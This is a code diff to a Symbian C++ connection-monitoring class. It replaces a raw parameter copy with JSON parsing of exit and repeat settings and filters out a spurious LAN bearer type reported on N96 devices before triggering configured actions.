@@ -7,6 +7,8 @@
 
 #include "EventConnection.h"
 
+#include "Json.h"
+
 #include <msvapi.h>
 #include <msvstd.h>
 #include <mmssettings.h>   //for CMmsSettings, retrieve mms access point
@@ -48,8 +50,55 @@ void CEventConnection::ConstructL(const TDesC8& params)
 	//__FLOG(_L("-------------"));
 	
 	BaseConstructL(params);
-	Mem::Copy(&iConnParams, iParams.Ptr(), sizeof(iConnParams));
 	
+	RBuf paramsBuf;
+		
+	TInt err = paramsBuf.Create(2*params.Size());
+	if(err == KErrNone)
+		{
+		paramsBuf.Copy(params);
+		}
+	else
+		{
+		//TODO: not enough memory
+		}
+		
+	paramsBuf.CleanupClosePushL();
+	CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
+	CleanupStack::PushL(jsonBuilder);
+	jsonBuilder->BuildFromJsonStringL(paramsBuf);
+	CJsonObject* rootObject;
+	jsonBuilder->GetDocumentObject(rootObject);
+	if(rootObject)
+		{
+		CleanupStack::PushL(rootObject);
+		//retrieve exit action
+		if(rootObject->Find(_L("end")) != KErrNotFound)
+			{
+			rootObject->GetIntL(_L("end"),iConnParams.iExitAction);
+			}
+		else
+			iConnParams.iExitAction = -1;
+			
+		//retrieve repeat action
+		if(rootObject->Find(_L("repeat")) != KErrNotFound)
+			{
+			rootObject->GetIntL(_L("repeat"),iConnParams.iRepeatAction);
+			rootObject->GetIntL(_L("iter"),iConnParams.iIter);
+			rootObject->GetIntL(_L("delay"),iConnParams.iDelay);
+			}
+		else
+			{
+			iConnParams.iRepeatAction = -1;
+			iConnParams.iIter = 0;
+			iConnParams.iDelay = 0;
+			}
+		CleanupStack::PopAndDestroy(rootObject);
+		}
+
+	CleanupStack::PopAndDestroy(jsonBuilder);
+	CleanupStack::PopAndDestroy(&paramsBuf);
+
 	//retrieve configured mms access point
 	iMmsApId = 0;
 	CMmsSettings* mmsSettings;
@@ -78,7 +127,7 @@ void CEventConnection::StartEventL()
 	iConnMon.GetConnectionCount(connCount,status);
 	User::WaitForRequest(status);
 	if ((status.Int() != KErrNone) || (connCount == 0))
-		{
+		{ 
 		iConnMon.NotifyEventL(*this);
 		return;
 		}
@@ -116,7 +165,7 @@ void CEventConnection::StartEventL()
 		if (status.Int() == KErrNone ) 
 		    {
 			TUint clientCount = buf().iCount;  //number of clients
-			for ( TInt i = 0; i < clientCount; i++ )
+			for ( TInt i = 0; i < clientCount; i++ ) 
 				{
 				TUid uid = buf().iUid[i];    //UID of the client
 				if(uid == iMyUid)
@@ -131,7 +180,10 @@ void CEventConnection::StartEventL()
 			{
 			continue;
 			}
-		if((bearerType >= EBearerWCDMA) && (bearerType <= EBearerWLAN))
+		// N96, and perhaps other devices, has a false connection of type EBearerLAN
+		// used by 0x10208413(dvbhmgr.exe) and 0x101f7b9a (fcastserver.exe)
+		// this is the reason why we filter out EBearerLAN type
+		if((bearerType != EBearerLAN) && ((bearerType >= EBearerWCDMA) && (bearerType <= EBearerWLAN)))  // values defined in rconnmon.h 
 			{
 			if((!isMmsConnection) && (!isOurConnection))
 				{
@@ -192,7 +244,10 @@ void CEventConnection::EventL( const CConnMonEventBase& aEvent )
             	{
             	break;
             	}
-            if((bearerType >= EBearerWCDMA) && (bearerType <= EBearerWLAN))
+    		// N96, and perhaps other devices, has a false connection of type EBearerLAN
+    		// used by 0x10208413(dvbhmgr.exe) and 0x101f7b9a (fcastserver.exe)
+    		// this is the reason why we filter out EBearerLAN type
+            if((bearerType != EBearerLAN) && ((bearerType >= EBearerWCDMA) && (bearerType <= EBearerWLAN))) //values defined  in rconnmon.h
             	{
             	if(!isMmsConnection && !isOurConnection)
             		{
@@ -217,7 +272,7 @@ void CEventConnection::EventL( const CConnMonEventBase& aEvent )
             if(iWasConnected && (iActiveConnArray.Count()==0))
             	{
             	iWasConnected = EFalse;
-            	if (iConnParams.iExitAction != 0xFFFFFFFF)
+            	if (iConnParams.iExitAction != -1)
 					{
             		SendActionTriggerToCoreL(iConnParams.iExitAction);
             		}
